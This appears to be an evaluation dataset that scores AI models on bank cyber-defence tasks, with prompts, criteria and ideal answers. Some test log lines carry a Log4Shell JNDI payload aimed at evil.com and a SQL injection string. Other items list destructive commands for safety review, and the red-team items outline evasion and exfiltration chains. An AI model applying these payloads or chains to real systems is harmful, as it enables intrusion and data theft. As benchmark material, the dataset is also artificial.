metadata.title: AI Cyber Defence System — Model Evaluation Dataset
metadata.description: Complete rewrite. Tests 3 models across 2 platforms: llama-3.1-8b-instant (Groq), DeepSeek V3.2 685B (NVIDIA NIM), Nemotron-3-Super 120B (NVIDIA NIM). 80 test cases covering all 12 PS requirements plus new V3 architecture tasks.

model_routing_rules.llama-3.1-8b-instant: Pre-filter triage, WebSocket event classification, real-time threat scoring, dashboard chat — high volume, free tier
model_routing_rules.deepseek-v3.2: Attack path analysis, remediation playbook generation, root cause analysis, threat landscape reports — complex reasoning
model_routing_rules.nemotron-3-super-120b-a12b: Red team simulation, MITRE ATT&CK kill chains, agentic multi-phase planning — 1M context
model_routing_rules.nemotron-content-safety-reasoning-4b: Verify that generated playbooks will not cause system damage — safety layer

metadata.how_to_use: Send each prompt to the model listed in model_target. Score response against expected_keywords_in_response. Record score per case. Compare totals across models.

evaluation_criteria.accuracy: Must return suspicious: false — internal IP, business hours, successful login is normal
evaluation_criteria.format: Must respond in valid JSON only with all 4 fields
evaluation_criteria.speed_suitability: Concise — this is a fast triage task

test_cases.ideal_answer_summary: suspicious: false, confidence: 0.92, reason: normal business hours login from internal IP, escalate: false

evaluation_criteria.accuracy: Must return suspicious: true, escalate: true
evaluation_criteria.reasoning: Must flag off-hours, high attempts, external IP

test_cases.ideal_answer_summary: suspicious: true, confidence: 0.98, reason: 95 failed admin logins at 2:47AM from external IP = brute force, escalate: true

evaluation_criteria.accuracy: Must flag 190x above baseline as highly suspicious

test_cases.ideal_answer_summary: suspicious: true, confidence: 0.96, reason: 380 calls/min vs baseline 2 = automated account balance scraping, escalate: true

evaluation_criteria.accuracy: Must escalate 1 and 3, not 2 and 4
evaluation_criteria.triage: Port 4444 = Metasploit default, /etc/passwd via web process = web shell indicator

test_cases.ideal_answer_summary: 1: escalate true (www-data reading /etc/passwd = web shell). 2: false (routine backup). 3: escalate true CRITICAL (java to 4444 = Metasploit C2). 4: false (normal login).

evaluation_criteria.accuracy: Must flag as suspicious despite appearing routine
evaluation_criteria.nuance: Must connect resignation + customer data + personal email as insider threat pattern

test_cases.ideal_answer_summary: suspicious: true, confidence: 0.92, reason: resigning employee exfiltrating customer data to personal email on Friday = insider threat, escalate: true

evaluation_criteria.accuracy: 1=Log4Shell/critical/true, 2=suspicious/high/true, 3=SQLi/critical/true, 4=recon/high/true, 5=normal/low/false
evaluation_criteria.format: Valid JSON array with all required fields
evaluation_criteria.triage_quality: Must correctly differentiate all 5 threat levels

test_cases.ideal_answer_summary: 1: Log4Shell critical true. 2: Config exposure high true. 3: SQL injection critical true. 4: Internal recon high true. 5: Normal low false.

evaluation_criteria.accuracy: 'sa' (SQL Server admin) from external IP = high/critical

test_cases.ideal_answer_summary: event_type: auth_failure, severity: high, display_message: Admin login attempt from external IP 185.220.101.45, alert_color: red, escalate: true

test_cases.prompt:
You are a real-time dashboard event classifier. Classify these 4 log lines for the WebSocket alert feed. Respond JSON array only.

1. "GET /robots.txt HTTP/1.1 200 from 45.33.22.11"
2. "POST /login username=admin' OR '1'='1 HTTP 500"
3. "GET /account?id=1003 user=cust_440 HTTP 200" (user is cust_440, account 1003 belongs to cust_999)
4. "java.lang.RuntimeException: ${jndi:ldap://evil.com/exploit} in X-Forwarded-For"

For each: {"log_id": int, "threat": str, "severity": str, "alert_color": str, "escalate": bool}

evaluation_criteria.accuracy: 1=recon/low/yellow/false, 2=SQLi/critical/red/true, 3=IDOR/high/orange/true, 4=Log4Shell/critical/red/true
evaluation_criteria.completeness: All 4 classified correctly

test_cases.ideal_answer_summary: 1: recon yellow false. 2: SQL injection red critical true. 3: IDOR orange high true. 4: Log4Shell red critical true.

evaluation_criteria.accuracy: Score should increase 20-35 points — aggressive port scan from external = serious recon

test_cases.ideal_answer_summary: new_score: 62-67, delta: +30-35, reason: aggressive external port scan = active reconnaissance, alert_level: warning

evaluation_criteria.accuracy: Final score must be 90+ after confirmed breach following recon pattern
evaluation_criteria.completeness: Must show score after each event
evaluation_criteria.urgency: Successful login after recon = confirmed breach, must trigger critical immediate action

test_cases.ideal_answer_summary: T+0: 55 (recon). T+20: 72 (brute force). T+45: 83 (active exploitation). T+72: 97 CRITICAL (breach). Final: 97. Immediate: Block IP + isolate admin panel NOW.

test_cases.prompt:
You are a senior cybersecurity analyst for a bank.

ZAP scan result:
{"alert": "SQL Injection", "risk": "High", "url": "http://bank.altoro.com/login", "param": "username", "evidence": "1=1", "cweid": "89"}

Explain this vulnerability and its specific impact on a banking application. Include the attack mechanism and what data could be exposed.

evaluation_criteria.accuracy: Must correctly explain SQL injection mechanism via username parameter
evaluation_criteria.banking_context: Must relate to banking data exposure — account numbers, customer records
evaluation_criteria.completeness: Must cover attack mechanism and data exposure

test_cases.ideal_answer_summary: SQL injection on login via username parameter allows attacker to manipulate DB queries, bypass authentication, and dump entire customer database including account numbers and transaction history.

test_cases.prompt:
You are a senior cybersecurity analyst for a bank.

Nessus scan results for host 10.0.0.5:
[
  {"cve": "CVE-2021-44228", "severity": "Critical", "cvss": 10.0, "service": "Apache Log4j", "port": 8080},
  {"cve": "CVE-2022-22965", "severity": "Critical", "cvss": 9.8, "service": "Spring Framework", "port": 8080},
  {"cve": "CVE-2019-0708", "severity": "Critical", "cvss": 9.8, "service": "RDP", "port": 3389}
]

Rank these by exploitation priority for a banking environment and explain the blast radius of each.

evaluation_criteria.accuracy: Must correctly identify Log4Shell as highest priority (CVSS 10, widely exploited)
evaluation_criteria.completeness: Must explain blast radius for each CVE
evaluation_criteria.ranking: Must provide justified ranking with reasons

test_cases.ideal_answer_summary: 1. Log4Shell (CVSS 10, RCE, actively exploited). 2. BlueKeep (wormable, lateral spread risk). 3. Spring4Shell (RCE but requires specific conditions). All need emergency patching.

test_cases.prompt:
You are a senior cybersecurity analyst for a bank.

ZAP scan results on banking transfer endpoint:
[
  {"alert": "CSRF", "risk": "High", "url": "/transfer", "method": "POST"},
  {"alert": "Insecure Cookie", "risk": "Medium", "param": "JSESSIONID", "evidence": "no HttpOnly, no Secure flag"}
]

Explain how these two vulnerabilities combine for a financial attack on bank customers.

evaluation_criteria.accuracy: Must explain how CSRF + insecure cookie enables unauthorised fund transfer
evaluation_criteria.completeness: Must describe full combined attack scenario
evaluation_criteria.banking_context: Must relate to financial theft from customer accounts

test_cases.ideal_answer_summary: Steal JSESSIONID via XSS (no HttpOnly). Use cookie to forge authenticated POST /transfer request (no CSRF token). Victim's account drained without knowledge. Combined risk: critical.

test_cases.prompt:
You are a senior cybersecurity analyst for a bank.

Multi-tool combined findings:
nmap: {"host": "10.0.0.5", "ports": [22, 80, 443, 3389, 3306]}
Nessus: [{"cve": "CVE-2017-0144", "name": "EternalBlue", "host": "10.0.0.5", "port": 445}, {"cve": "CVE-2020-1472", "name": "Zerologon", "host": "10.0.0.2", "service": "Netlogon"}]
ZAP: [{"alert": "SQL Injection", "url": "/login"}, {"alert": "SSRF", "url": "/fetch?url="}]

All are weaponised with public exploits. Construct the most dangerous combined attack scenario using all findings.

evaluation_criteria.accuracy: Must chain vulnerabilities logically — SQLi or SSRF for initial, EternalBlue for lateral, Zerologon for domain compromise
evaluation_criteria.completeness: Must use findings from all 3 tools
evaluation_criteria.sophistication: Must demonstrate understanding of how vulnerabilities chain together for maximum impact

test_cases.ideal_answer_summary: SSRF → AWS metadata credential theft → internal access → EternalBlue lateral movement → Zerologon = instant domain admin = entire network. Or: SQLi → DB creds → internal auth → same endpoint.

evaluation_criteria.accuracy: Must assess as high-confidence imminent attack
evaluation_criteria.completeness: Must address all 4 OSINT findings
evaluation_criteria.intelligence: Must connect phishing kit + leaked creds + dark web listing as coordinated campaign

test_cases.ideal_answer_summary: High confidence imminent attack. Phishing kit + dark web creds + 8-hour window = active campaign in preparation. Admin and CFO credentials exposed = targeted access. Unregistered subdomain = shadow IT attack surface. Attack expected within 24 hours.

evaluation_criteria.accuracy: Must correctly identify 3-tier architecture and DB port exposure
evaluation_criteria.completeness: Must flag MySQL 3306 as critical exposure
evaluation_criteria.clarity: Must clearly distinguish internet-facing vs internal assets

test_cases.ideal_answer_summary: Three-tier architecture. Web server internet-facing (acceptable). DB port 3306 should never be internet accessible. App server should be internal only. Critical risk: database directly reachable.

evaluation_criteria.accuracy: Must identify 4444 as Metasploit default C2 port
evaluation_criteria.urgency: 10.0.0.150:4444 = ACTIVE COMPROMISE INDICATOR — must be treated as critical
evaluation_criteria.completeness: Must flag both hosts as suspicious for different reasons

test_cases.ideal_answer_summary: 10.0.0.99 (Raspberry Pi) = rogue/unauthorized device, possible insider or IoT breach. 10.0.0.150:4444 = ACTIVE Metasploit C2 channel = network is likely already compromised. Isolate both immediately.

evaluation_criteria.accuracy: Must identify all 3 as EOL with specific known exploits
evaluation_criteria.completeness: Must give upgrade path for each system
evaluation_criteria.urgency: EOL + known wormable exploits = emergency situation

test_cases.ideal_answer_summary: All 3 EOL — no security patches. Windows 2008 + SMB = EternalBlue/WannaCry risk (wormable). CentOS 6.5 EOL Nov 2020. Ubuntu 14.04 EOL Apr 2019. Emergency: patch or isolate immediately. Upgrade: Windows Server 2022, CentOS Stream 9, Ubuntu 24.04.

evaluation_criteria.accuracy: Must connect brute force → valid account → API data scraping as 3-step chain
evaluation_criteria.format: Structured JSON with attack_path array and MITRE references
evaluation_criteria.mitre: Must reference MITRE ATT&CK tactics and technique IDs

test_cases.ideal_answer_summary: Step 1: T1110 Brute Force admin login. Step 2: T1078 Valid Accounts — if successful, use credentials. Step 3: T1530 API scraping of account balances. Risk: 84. Time to impact: 6 minutes.

evaluation_criteria.accuracy: Must identify active Log4Shell exploitation in progress
evaluation_criteria.urgency: Must communicate attack chain will complete in minutes without intervention
evaluation_criteria.completeness: Full chain: Log4Shell RCE → sudo priv esc → DB access

test_cases.ideal_answer_summary: ACTIVE ATTACK: JNDI = Log4Shell exploitation NOW (T1190). Step 2: Sudo exploit on app server = root in <5 min (T1068). Step 3: DB dump via app server. Total compromise in 12-15 minutes. Isolate web server IMMEDIATELY.

test_cases.prompt:
You are a senior cybersecurity analyst for a bank.

Full threat intelligence picture:
nmap: {"open_ports": [22, 80, 443, 3306, 8080]}
Nessus: [{"cve": "CVE-2022-22965", "severity": "Critical"}, {"cve": "CVE-2021-44228", "severity": "Critical"}]
ZAP: [{"alert": "CSRF", "url": "/transfer"}, {"alert": "Broken Auth", "url": "/admin"}]
SpiderFoot: [{"type": "DARKWEB_MENTION", "data": "Bank targeted on dark web"}, {"type": "LEAKED_CREDS", "data": "3 staff emails in breach DB"}]
Logs: [{"type": "port_scan", "source": "45.33.22.11", "timestamp": "yesterday"}]

Is an attack imminent? Predict the likely attack scenario with confidence rating.

evaluation_criteria.accuracy: Must identify all pre-attack indicators and connect them
evaluation_criteria.completeness: Must correlate all 4 tool outputs into unified threat picture
evaluation_criteria.prediction: Must give specific attack scenario with confidence rating

test_cases.ideal_answer_summary: High confidence imminent attack (0.91). Dark web targeting + leaked creds + port scan yesterday = active recon phase. Likely: credential stuffing → Spring4Shell/Log4Shell RCE → CSRF on /transfer for fund theft. Attack window: next 24 hours.

evaluation_criteria.accuracy: Must identify Friday + reduced SOC as attacker's preferred timing
evaluation_criteria.completeness: Must connect all 5 data points into coherent prediction
evaluation_criteria.recommendation: Must recommend keeping full SOC tonight

test_cases.ideal_answer_summary: High probability attack tonight. Pattern: escalating Mon-Thu recon = final preparation. 18:00 SOC reduction = attacker's window. Neighbouring bank breach last Friday = same actor testing TTPs. 2 unpatched CVEs = known entry points. Recommendation: maintain full SOC, emergency CVE patching.

evaluation_criteria.format: Valid JSON with steps array, all required fields per step
evaluation_criteria.accuracy: IP block must be step 1
evaluation_criteria.completeness: Must include containment, evidence, notification
evaluation_criteria.legal: Must mention GDPR/regulatory notification for 8000 records

test_cases.ideal_answer_summary: Step 1: iptables block IP (immediate, ops, 2min). Step 2: Preserve DB audit logs (immediate, forensics, 5min). Step 3: WAF SQL injection rule (immediate, security, 5min). Step 4: Notify legal re 8000 records GDPR (immediate, legal). Step 5: Prepared statements patch (short-term, dev).

test_cases.prompt:
You are a senior cybersecurity analyst for a bank.

Multi-vector attack confirmed RIGHT NOW:
{"attack_1": {"type": "Log4Shell RCE", "host": "10.0.0.5", "status": "exploiting"},
"attack_2": {"type": "Privilege escalation to root", "host": "10.0.0.8", "status": "completed"},
"attack_3": {"type": "Database exfiltration", "host": "10.0.0.10", "records_per_second": 200, "status": "active"}}

Time critical — exfiltration is ONGOING. Generate emergency Kill Switch playbook. Stopping the data leak is the absolute priority.

evaluation_criteria.accuracy: Must prioritise stopping DB exfiltration above all else
evaluation_criteria.completeness: Must address all 3 simultaneous attack vectors
evaluation_criteria.parallel: Must recognise isolation of 10.0.0.10 and 10.0.0.5 can happen in parallel

test_cases.ideal_answer_summary: PARALLEL IMMEDIATE: Block all outbound from 10.0.0.10 (stop leak). Isolate 10.0.0.5 (stop RCE). Then: forensic snapshot 10.0.0.8 (root compromise). Assess leak volume: 200 rec/sec = ~12,000/min already stolen.

test_cases.prompt:
You are a senior cybersecurity analyst for a bank.

Leaked credentials found by SpiderFoot:
{"type": "LEAKED_CREDS", "count": 5, "accounts": ["admin@altoro.com", "cfo@altoro.com", "dev1@altoro.com", "staff2@altoro.com", "dba@altoro.com"]}

Generate an emergency credential compromise response playbook in JSON format with prioritised steps.

evaluation_criteria.accuracy: Must treat admin, CFO, and DBA as highest priority accounts
evaluation_criteria.completeness: Must include session invalidation, audit review, and MFA enforcement
evaluation_criteria.urgency: Emergency framing — these credentials may already be in use

test_cases.ideal_answer_summary: Priority 1: Force reset admin + CFO + DBA (highest privilege). Invalidate all active sessions. Enable MFA on all 5 accounts. Check audit logs for suspicious activity since credentials appeared in breach DB. Check password reuse on other systems.

test_cases.prompt:
You are a senior cybersecurity analyst for a bank.

Ransomware detected across 3 servers:
{"type": "Ransomware", "affected": ["web-server", "app-server", "file-server"], "encryption_start": "23:00", "ransom_note": true, "backup_age": "18 hours", "services_down": true, "customer_impact": "banking portal offline"}

Generate complete ransomware Kill Switch playbook.

evaluation_criteria.accuracy: Network isolation must be step 1
evaluation_criteria.completeness: Must cover containment, eradication, recovery, communication, legal
evaluation_criteria.ransomware_specific: Must address ransom payment decision and backup restoration

test_cases.ideal_answer_summary: Step 1: Isolate all 3 servers from network (kill switches). Do NOT pay ransom. Activate business continuity. Restore from 18hr backup (assess data loss window). Notify regulators and customers. Report to FBI Cybercrime. Full forensic investigation of entry point.

evaluation_criteria.accuracy: IP block must be first step
evaluation_criteria.completeness: Must include containment, eradication, recovery phases

test_cases.ideal_answer_summary: Step 1: Block IP 45.33.22.11 at firewall immediately. Step 2: Enable CAPTCHA + account lockout after 5 attempts. Step 3: Alert SOC. Step 4: Review all accounts targeted. Step 5: Implement rate limiting. Step 6: Review for other attack vectors from same IP.

evaluation_criteria.accuracy: Must flag 3:42 AM off-hours service account root escalation as critical
evaluation_criteria.completeness: Containment + forensic preservation + investigation steps
evaluation_criteria.forensic: Must recommend preserving system state before changes

test_cases.ideal_answer_summary: High suspicion: service accounts never need root, off-hours. Assume compromise until proven otherwise. Immediately isolate app-server. Preserve memory dump and logs. Investigate what triggered sudo. Check for lateral movement.

evaluation_criteria.accuracy: Must recommend CDN/scrubbing centre as primary mitigation
evaluation_criteria.completeness: Technical mitigation + customer communication + ISP contact
evaluation_criteria.realism: Must acknowledge IP blocking is ineffective for 650+ distributed sources

test_cases.ideal_answer_summary: Contact upstream ISP for BGP blackhole routing. Enable Cloudflare DDoS scrubbing. CAPTCHA on login. Rate limiting by geo. Customer communication via alternate channels. Post-incident: dedicated DDoS protection service contract.

evaluation_criteria.accuracy: Must immediately revoke all access as first step
evaluation_criteria.completeness: Must involve HR, Legal, preserve forensic evidence, GDPR assessment
evaluation_criteria.legal: Must mention data breach notification obligations for 50K records

test_cases.ideal_answer_summary: Step 1: Revoke all system access immediately. Step 2: Secure USB as forensic evidence (chain of custody). Step 3: Involve HR and Legal. Step 4: GDPR 72-hour notification assessment (50K PII records). Step 5: Review last 3 days' access logs. Step 6: Update offboarding security checklist.

test_cases.prompt:
You are a senior cybersecurity analyst for a bank.

Post-Kill-Switch incident timeline:
[{"time": "21:00", "event": "Port scan from 45.33.22.11"}, {"time": "21:15", "event": "50 failed logins on /admin"}, {"time": "21:30", "event": "Successful admin login from 45.33.22.11"}, {"time": "21:35", "event": "Admin password changed"}, {"time": "21:40", "event": "New backdoor admin account created"}, {"time": "21:55", "event": "Kill Switch approved and deployed — attacker blocked"}]

Perform root cause analysis.

evaluation_criteria.accuracy: Must identify missing lockout policy as root cause
evaluation_criteria.completeness: Must walk through each timeline event
evaluation_criteria.lessons: Must recommend MFA + lockout as preventive measures

test_cases.ideal_answer_summary: Root cause: No account lockout policy + weak admin password. Kill chain: recon → brute force (15 min success) → admin takeover → persistence via new account. Prevention: account lockout after 5 attempts + MFA mandatory for admin.

test_cases.prompt:
You are a senior cybersecurity analyst for a bank.

Customer reported $5,000 unauthorised transfer. Investigation logs:
[{"time": "14:00", "event": "Customer logged in from home IP"}, {"time": "14:01", "event": "Session cookie transmitted over HTTP (not HTTPS)"}, {"time": "14:03", "event": "Login from new IP 45.33.22.11 using same session"}, {"time": "14:05", "event": "$5,000 transfer initiated and completed"}]

Perform root cause analysis of this financial fraud.

evaluation_criteria.accuracy: Must identify HTTP cookie transmission as root cause
evaluation_criteria.completeness: Must trace full timeline with causal links
evaluation_criteria.remediation: Must explain HTTPS + Secure flag + HSTS as fix

test_cases.ideal_answer_summary: Root cause: Session cookie sent over HTTP = intercepted via MitM. Attacker reused stolen cookie 2 minutes later to authorise $5,000 transfer. Fix: Force HTTPS everywhere, Secure cookie flag, HSTS header, session IP binding.

test_cases.prompt:
You are a senior cybersecurity analyst for a bank.

Post-breach reconstruction:
{"march_1": "SpiderFoot detected leaked credentials on dark web",
"march_1_action": "Alert generated but not acted upon — no automated remediation",
"march_5": "VPN login with stolen credentials from Russia",
"march_6": "Attacker ran internal nmap scan",
"march_8": "Log4j exploited on internal server",
"march_10": "Database dumped — 45,000 customer records",
"march_13": "Customer fraud complaints triggered investigation"}

Write a full root cause analysis report with lessons learned.

evaluation_criteria.accuracy: Must identify ignoring dark web alert on March 1 as primary failure
evaluation_criteria.completeness: Must cover full 12-day timeline with causal analysis
evaluation_criteria.lessons: Must provide at least 5 specific actionable lessons

test_cases.ideal_answer_summary: Primary failure: Dark web credential alert not acted upon. 12-day dwell time. 5 lessons: automated credential reset on dark web detection, VPN geo-restriction, internal anomaly detection, Log4j patching, SIEM alerting for unusual internal scanning.

evaluation_criteria.accuracy: Must recommend closing FTP 21, Telnet 23, MySQL 3306 as priority
evaluation_criteria.completeness: Must address all 8 ports with specific action
evaluation_criteria.specificity: Must provide actual firewall rule suggestions or iptables syntax

test_cases.ideal_answer_summary: Close: 21 (FTP - use SFTP), 23 (Telnet - use SSH), 3306 (MySQL - internal only, bind to localhost), 8080 (redirect to 8443 or close). Restrict 22 to specific management IPs. Keep 80 (redirect to 443), 443, 8443.

evaluation_criteria.accuracy: Must provide correct header values for all 6
evaluation_criteria.completeness: Must give both nginx and Apache config syntax
evaluation_criteria.specificity: Must include actual config file lines, not just descriptions

test_cases.ideal_answer_summary: nginx: add_header X-Frame-Options DENY; add_header Strict-Transport-Security max-age=31536000; add_header X-Content-Type-Options nosniff; add_header Content-Security-Policy default-src self; Apache equivalents with Header always set.

evaluation_criteria.accuracy: Must address all 6 misconfigurations
evaluation_criteria.priority: S3 public backup + AdministratorAccess = most critical

test_cases.ideal_answer_summary: Critical: S3 block-public-access enable (customer backups exposed!), remove AdministratorAccess IAM. High: Security groups — specific ports only, no 0.0.0.0/0. Enable CloudTrail. EBS encryption at rest. RDS: disable public access, rotate credentials.

evaluation_criteria.accuracy: Must weight data exfiltration attempt as highest severity
evaluation_criteria.completeness: Must address all 8 metrics
evaluation_criteria.scoring: Risk score must be justified by the data — should be 75-85 given these metrics

test_cases.ideal_answer_summary: Risk score: 79/100 (High). Data exfiltration attempt + 2 dark web mentions = active targeting. Top 3: 1) Data exfil investigation, 2) Patch 3 critical CVEs, 3) Dark web intel response. Bank is under active reconnaissance.

test_cases.prompt:
You are a senior cybersecurity analyst for a bank.

Board-level threat briefing request. Intelligence:
{"external": {"apt_group": "FIN7 active in region targeting banks", "phishing_kit": "Altoro Mutual branded kit found on GitHub", "leaked_creds": 5, "darkweb_mentions": 2},
"internal": {"critical_cves_unpatched": 3, "no_mfa": true, "outdated_systems": 4, "backup_untested": true},
"recent": {"port_scans_this_week": 28, "failed_logins": 820, "data_exfil_attempt": 1}}

Write a board-level threat landscape briefing — non-technical executives audience.

evaluation_criteria.accuracy: Must identify FIN7 as a known banking threat actor
evaluation_criteria.completeness: Must cover all three intelligence categories
evaluation_criteria.executive_audience: Must be written for non-technical C-suite — no jargon without explanation

test_cases.ideal_answer_summary: Board briefing: FIN7 criminal group actively targeting banks in our region. Custom phishing kit built for our bank = targeted campaign. No MFA = critical gap. 3 critical vulnerabilities unpatched. Recommendation: Emergency 48-hour security sprint. Financial risk: potential breach cost $2-5M.

test_cases.prompt:
You are a senior cybersecurity analyst for a bank.

Security control test results:
[
  {"control": "WAF", "test": "SQL injection with URL encoding bypass", "result": "BYPASSED"},
  {"control": "IDS", "test": "Slow port scan (1 packet/min)", "result": "NOT DETECTED"},
  {"control": "Email filter", "test": "Phishing email with known payload", "result": "BLOCKED"},
  {"control": "MFA", "test": "Login with stolen password only", "result": "BLOCKED"},
  {"control": "DLP", "test": "Email 1000 customer records as attachment", "result": "NOT DETECTED"}
]

Analyse which controls are effective and identify the gaps.

evaluation_criteria.accuracy: Must correctly identify 3 failing and 2 passing controls
evaluation_criteria.completeness: Must explain why each control failed
evaluation_criteria.recommendations: Must suggest specific fixes for each failing control

test_cases.ideal_answer_summary: Working: Email filter, MFA. Failed: WAF (needs encoding-aware ruleset), IDS (needs behavioural detection not just signature), DLP (needs content inspection for PII patterns). Priority: DLP gap = data exfiltration undetectable.

test_cases.prompt:
You are a senior cybersecurity analyst for a bank.

Annual penetration test results:
{"year": 2026, "critical_findings": 4, "high_findings": 11, "same_as_last_year": 9, "new_findings": 6, "remediated_from_last_year": 2, "overall_score": "39/100"}

This is the second consecutive annual pentest. Analyse the trend and generate an executive report with security improvement roadmap.

evaluation_criteria.accuracy: Must highlight 9 repeat findings as systemic remediation failure
evaluation_criteria.completeness: Trend analysis + roadmap + executive framing
evaluation_criteria.roadmap: Must include quarterly milestones and ownership

test_cases.ideal_answer_summary: Critical concern: 9 of last year's findings unresolved = remediation process broken. Score 39/100 unacceptable. New findings = attack surface growing. Q1: fix all 4 criticals. Q2: fix all 11 highs. Q3: process overhaul. Q4: retest target 70+.

test_cases.prompt:
You are a security playbook safety verifier. Review this remediation command and confirm it is safe to execute on a production banking server. Respond in JSON: {"safe": bool, "risk": "none|low|medium|high", "concern": str or null, "approved": bool}

Command: "iptables -A INPUT -s 185.220.101.45 -j DROP"

evaluation_criteria.accuracy: Must approve — blocking a single specific IP is safe
evaluation_criteria.reasoning: Must confirm this is a targeted block, not disruptive

test_cases.ideal_answer_summary: safe: true, risk: low, concern: null, approved: true. Blocks single attacker IP. Does not affect legitimate traffic.

test_cases.prompt:
You are a security playbook safety verifier. Review this remediation command and confirm it is safe to execute on a production banking server. Respond in JSON: {"safe": bool, "risk": "none|low|medium|high", "concern": str or null, "approved": bool}

Command: "iptables -F" (flush all firewall rules)

evaluation_criteria.accuracy: Must reject — flushing all iptables rules exposes server completely
evaluation_criteria.reasoning: Must explain this removes ALL firewall protection

test_cases.ideal_answer_summary: safe: false, risk: high, concern: Flushing all iptables rules removes ALL firewall protection, exposing server to internet. approved: false. Safer alternative: iptables -D INPUT to remove specific rule only.

test_cases.prompt:
You are a security playbook safety verifier. Review this remediation batch and identify which commands are safe and which are dangerous. Respond in JSON array.

Commands:
1. "systemctl stop apache2"
2. "rm -rf /var/log/apache2/"
3. "mysqladmin -u root flush-logs"
4. "kill -9 $(pgrep java)"
5. "ufw allow from 10.0.0.0/24 to any port 3306"

For each: {"cmd_id": int, "safe": bool, "risk": str, "concern": str, "approved": bool}

evaluation_criteria.accuracy: Must flag: 1=medium risk (downtime), 2=dangerous (destroys forensic evidence), 4=high risk (kills all Java processes including bank app)
evaluation_criteria.completeness: All 5 commands assessed
evaluation_criteria.forensic_awareness: Must flag log deletion as destroying forensic evidence

test_cases.ideal_answer_summary: 1: medium/approved with caveat (downtime). 2: NOT APPROVED — destroys forensic evidence. 3: low/approved. 4: NOT APPROVED — kills all Java including bank application. 5: approved — restricts MySQL to internal network.

evaluation_criteria.accuracy: Must choose T1190 SQL injection given confirmed vulnerability
evaluation_criteria.reasoning: Must explain why technical exploit beats phishing given available intelligence

test_cases.ideal_answer_summary: technique: Exploit Public-Facing Application, mitre_id: T1190, justification: SQL injection confirmed on /login — more reliable than phishing, no victim action needed. next_phase: Execution. success_probability: 0.89.

test_cases.prompt:
You are a red team AI conducting full MITRE ATT&CK kill chain simulation on Altoro Mutual bank.

Completed phases:
- T1190 SQL injection — SUCCESS — extracted DB schema
- T1552 Found admin:p@ssw0rd123 in config table — SUCCESS
- T1078 Admin login successful — SUCCESS

Simulate next 3 MITRE phases (Persistence, Privilege Escalation, Lateral Movement). For each: {"phase": str, "technique_id": str, "technique_name": str, "action": str, "target": str, "success_probability": float}

evaluation_criteria.accuracy: Must select correct MITRE techniques for each phase
evaluation_criteria.format: Valid JSON array with all required fields
evaluation_criteria.chain_logic: Each phase must logically build on previous

test_cases.ideal_answer_summary: Persistence: T1136 Create Account (backdoor admin). PrivEsc: T1078 use admin credentials for system-level access. Lateral Movement: T1021 Remote Services — use admin creds to access app server. All chain logically.

test_cases.prompt:
You are a red team AI. Full kill chain simulation on Altoro Mutual bank is complete.

Simulation results:
{"T1190_initial_access": "SUCCESS", "T1059_execution": "SUCCESS", "T1136_persistence": "SUCCESS — UNDETECTED", "T1078_priv_esc": "SUCCESS — UNDETECTED", "T1021_lateral_movement": "FAILED — WAF blocked", "T1005_collection": "NOT REACHED"}

Generate purple team report: defences that worked, defences that failed, kill chain break point, top 3 security gaps, bank security grade A-F.

evaluation_criteria.accuracy: Must identify WAF as working defence
evaluation_criteria.completeness: All 5 required sections present
evaluation_criteria.grade: Must justify grade — D or F given persistence and priv esc went undetected
evaluation_criteria.purple_team: Must provide both attacker and defender perspective

test_cases.ideal_answer_summary: Working: WAF (stopped lateral movement). Failed: No detection for initial access, execution, persistence, priv esc — all 4 undetected. Kill chain broken at T1021. Gaps: 1) No IDS/SIEM 2) SQLi prevention 3) Privilege monitoring. Grade: D (WAF only working control, 4 phases undetected).

evaluation_criteria.accuracy: Must demonstrate APT sophistication vs script kiddie
evaluation_criteria.completeness: Must cover all APT phases including C2 and dwell time
evaluation_criteria.technical_depth: Must leverage specific tech stack vulnerabilities (Tomcat 7, Java 8)

test_cases.ideal_answer_summary: Phase 1: Spear phish CFO. Phase 2: Establish C2 via HTTPS beacon. Phase 3: Dwell 2 weeks — map internal network quietly. Phase 4: Tomcat 7 deserialisation RCE. Phase 5: Root access, DB dump. Phase 6: Slow exfil over 3 days via DNS tunnelling to avoid DLP detection.

test_cases.prompt:
You are a red team AI conducting a purple team exercise on Altoro Mutual bank.

Defences in place: WAF, IDS, MFA, email filtering
Vulnerabilities: SSRF on /fetch endpoint, Tomcat 7 RCE, weak session management

Simulate a complete attack that evades ALL 4 defensive controls. Then provide exact detection opportunities the blue team missed at each evasion step.

evaluation_criteria.accuracy: Must demonstrate realistic evasion technique for each control
evaluation_criteria.completeness: Must cover attack AND detection opportunities
evaluation_criteria.sophistication: Purple team format requires both attacker and defender analysis

test_cases.ideal_answer_summary: WAF bypass: URL-encoded SSRF payload. IDS evasion: 1 packet/min slow scan. MFA bypass: SIM swap on employee. Tomcat 7 RCE for full access. Blue team missed: encoding anomaly in logs, SIM swap alert, unusual outbound SSRF traffic, Java process spawning shell.

evaluation_criteria.accuracy: Must correctly model supply chain attack via single maintainer compromise
evaluation_criteria.completeness: Must cover attacker methodology and bank impact
evaluation_criteria.sophistication: Must reference real-world supply chain techniques

test_cases.ideal_answer_summary: Compromise sole maintainer via phishing → inject backdoor in v2.3.2 → bank updates via automatic dependency update → malicious code executes in payment processing. Defence: SBOM, pin dependencies, code signing verification, vendor security review.

evaluation_criteria.accuracy: Must demonstrate realistic social engineering techniques (pretexting, urgency, authority)
evaluation_criteria.completeness: Must cover pretext, execution, data extraction, and defences
evaluation_criteria.defensive: Must identify specific controls that would prevent this

test_cases.ideal_answer_summary: Pretext: IT helpdesk emergency system breach. Urgency: account compromised, verify identity now. Extract: employee credentials, customer account info, reset procedures. Defence: callback verification policy, never share credentials by phone, security awareness training.

test_cases.prompt:
You are a senior cybersecurity analyst for a bank.

ZAP finding on AWS-hosted banking application:
{"alert": "Server Side Request Forgery", "risk": "High", "url": "/fetch?url=http://internal-service", "evidence": "Internal service data returned"}

Explain why SSRF is especially dangerous in an AWS EC2 environment.

evaluation_criteria.accuracy: Must mention AWS metadata service 169.254.169.254
evaluation_criteria.completeness: Must explain SSRF → metadata → IAM credentials → full AWS account access chain
evaluation_criteria.cloud_context: Must demonstrate AWS-specific impact beyond generic SSRF

test_cases.ideal_answer_summary: SSRF on AWS can reach metadata service at 169.254.169.254 to steal EC2 IAM role credentials. With IAM credentials: access all S3 buckets, RDS databases, other EC2 instances. Full cloud account compromise from single SSRF.

test_cases.prompt:
You are a senior cybersecurity analyst for a bank.

Pre-attack indicators detected (attack not yet started):
{"darkweb_mention": true, "port_scans_last_48h": 12, "leaked_credentials": 3, "unpatched_cve": "CVE-2021-44228", "phishing_kit_found": true}

